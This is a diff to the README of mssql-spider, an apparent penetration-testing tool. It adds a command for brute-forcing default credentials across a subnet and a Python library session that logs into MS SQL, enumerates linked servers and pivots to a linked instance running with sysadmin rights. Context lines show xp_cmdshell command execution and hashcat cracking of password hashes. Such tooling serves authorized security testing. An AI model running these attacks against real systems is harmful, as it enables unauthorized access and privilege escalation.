@@ -43,6 +43,12 @@ Authenticate via Kerberos and execute a command trough `xp_cmdshell` on all host
 mssql-spider -k -n -x 'whoami /groups' db01.corp.local:50123 db02.corp.com:1433
 ~~~
 
+Brute force default credentials.
+
+~~~ bash
+mssql-spider --credentials ./assets/default-credentials.txt 192.168.178.0/24
+~~~
+
 Detailed help:
 
 ~~~
@@ -101,4 +107,18 @@ Dumped database password hashes can be cracked with [hashcat](https://github.com
 
 ~~~ bash
 hashcat -O -w 3 -a 0 -m 1731 --username ./hashes.txt ./rockyou.txt
+~~~
+
+## Usage as library
+
+~~~
+❯ python3
+>>> from mssql_spider.client import MSSQLClient
+>>> client = MSSQLClient.connect('192.168.118.140', 1433)
+>>> client.login(username='webapp11', password='passw0rd', windows_auth=False)
+>>> client.enum_links()
+{'SQL11\\SQLEXPRESS': {'local_login': 'NULL', 'remote_login': 'NULL'}, 'SQL27': {'local_login': 'webapp11', 'remote_login': 'webappGroup'}, 'SQL53': {'local_login': 'webapp11', 'remote_login': 'testAccount'}}
+>>> linked_instance = client.use_link('SQL27')
+>>> linked_instance.whoami()
+{'host': 'sql27', 'login': 'sa', 'user': 'dbo', 'roles': {'db_denydatareader', 'dbcreator', 'db_datareader', 'public', 'db_denydatawriter', 'db_accessadmin', 'setupadmin', 'serveradmin', 'db_backupoperator', 'diskadmin', 'bulkadmin', 'db_owner', 'securityadmin', 'sysadmin', 'db_datawriter', 'processadmin', 'db_ddladmin', 'db_securityadmin'}}
 ~~~
